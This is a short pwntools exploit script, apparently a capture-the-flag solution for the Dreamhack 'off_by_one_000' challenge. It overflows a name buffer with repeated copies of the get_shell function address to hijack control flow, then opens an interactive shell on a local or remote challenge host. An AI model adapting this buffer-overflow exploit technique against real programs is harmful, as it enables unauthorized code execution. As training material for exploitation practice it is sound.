    # form solve pwn đỡ phải viết script =)))
    #!/usr/bin/env python3

    from pwn import *

    exe = ELF("./off_by_one_000")
    # libc = ELF("./libc-2.27.so")
    # ld = ELF("./ld-2.27.so")

    context.binary = exe


    def conn():
        if args.LOCAL:
            r = process([exe.path])
            gdb.attach(r, gdbscript = '''
                    b*main+64
                    b*cpy+0
                    c
                    ''')
            input()
        else:
            r = remote("host3.dreamhack.games", 17014)

        return r


    def main():
        r = conn()

        payload = p32(exe.sym['get_shell']) * (256 // 4)
        
        r.sendafter(b"Name: ", payload)
        r.interactive()


    if __name__ == "__main__":
        main()